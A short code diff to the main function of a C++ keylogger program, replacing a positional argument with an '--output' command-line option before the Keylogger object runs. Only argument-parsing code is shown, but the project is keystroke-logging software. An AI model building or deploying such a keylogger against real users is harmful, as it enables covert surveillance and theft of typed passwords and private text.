@@ -2,6 +2,7 @@
 #include <iostream>
 
 #include "keylogger.hpp"
+#include "../utilities/cli.hpp"
 
 void signal_handler(int signum) {
   // This is a temporary workaround to end the run loop and allow the
@@ -15,7 +16,10 @@ int main(int argc, char** argv) {
   signal(SIGINT, signal_handler);
 
   try {
-    Keylogger k(argv[1]);
+    ArgParser p(argv, argv + argc);
+    auto output = p.parse_string("--output");
+
+    Keylogger k(output.value());
     k.Run();
   } catch (const std::exception& e) {
     std::cerr << "error: " << e.what() << std::endl;
